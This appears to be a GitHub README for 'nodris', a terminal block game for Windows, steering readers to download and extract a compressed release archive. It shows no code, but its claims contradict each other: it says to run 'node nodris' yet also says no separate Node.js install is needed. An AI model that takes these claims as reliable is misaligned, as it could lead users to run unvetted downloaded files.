# 🕹️ nodris - Play classic block games in terminal

[![Download nodris](https://img.shields.io/badge/Download_nodris-blue)](https://github.com/Biologicaltimemistral1034/nodris/releases)

nodris brings the classic block game to your computer terminal. It runs on pure Node.js. It requires no extra software installations on your machine. You play the game inside your command prompt window. You move, rotate, and stack blocks to clear lines. The game tracks your score as you play. It supports Windows systems.

## 🏗️ How it works

The game uses standard terminal text characters. Your computer draws the game board using these characters. This approach keeps the game size small. You do not need large graphics files or background engines. The program handles all game logic internally. This design makes the game start fast and run smooth on most computers.

## 📥 Getting the game

You need to download the program files first. Follow these instructions to get the game on your Windows computer:

1. Visit the [official releases page](https://github.com/Biologicaltimemistral1034/nodris/releases).
2. Look for the latest version at the top of the list.
3. Click the link that matches your system.
4. Save the file to your desktop or a folder you can find.

The file comes in a compressed folder. Right-click the file and select "Extract All." This creates a new folder with the game files inside. Open this folder to see the application.

## 💻 Playing the game

Once you download the files, you must run the program through your command terminal.

1. Open your Start menu.
2. Type "powershell" and press Enter.
3. Use the `cd` command to navigate to the game folder. For example, if your folder is on the desktop, type `cd Desktop\nodris` and press Enter.
4. Type `node nodris` in the window and press Enter.

The game board appears in your window. You can now start playing. 

## ⌨️ Controls

The game uses your keyboard to shift the blocks. You shift the blocks during the descent to build clean rows.

- Left Arrow: Move the piece left.
- Right Arrow: Move the piece right.
- Up Arrow: Rotate the piece.
- Down Arrow: Speed up the piece drop.
- Spacebar: Drop the piece instantly.

The game ends when the blocks reach the top of the board. You can start a new session by closing the window and running the command again.

## ⚙️ System settings

This game runs best in a standard terminal window of at least 80 characters wide. If the game appears messy, resize your terminal window to make it wider. Most Windows terminal versions work without hidden setup steps. We built the game to be light. It consumes very little memory. You can keep other programs open while you play.

## 🔧 Frequently asked questions

**Do I need to install Node.js separately?**
The package includes what you need to run the game without external setup.

**Does the game save my high score?**
The current version resets your score when you close the terminal window. Future updates will include a file to track your best scores.

**My screen looks weird during the game.**
Ensure your terminal font is set to a fixed-width style like Consolas or Lucida Console. This keeps the block characters aligned.

**Does the game require internet?**
No. Once you download the folder, the game runs offline on your local machine.

## 🛠️ Troubleshooting

If the game does not start, verify you extracted all files from the download. Ensure you placed the files in a folder where you have read and write permissions. If the terminal displays an error regarding the command, check if you typed the name of the file correctly.

Contact the repository maintainers if you encounter issues that prevent the game from starting. Provide the exact error message from your terminal window if possible. This helps us find the cause of the problem.

## 📚 Game features

The game includes several features to improve your experience:

- Real-time score tracking: Watch your points grow as you clear rows.
- Dynamic speed: The blocks fall faster as you reach higher levels.
- Low resource usage: The game avoids taxing your processor.
- Responsive input: Controls react fast to your key presses.
- Clean display: The interface shows your current level, score, and the next piece coming up.

The game board uses standard ANSI color codes. These codes allow the terminal to display colored blocks without needing a graphic card. This makes the game compatible with most modern Windows terminal emulators.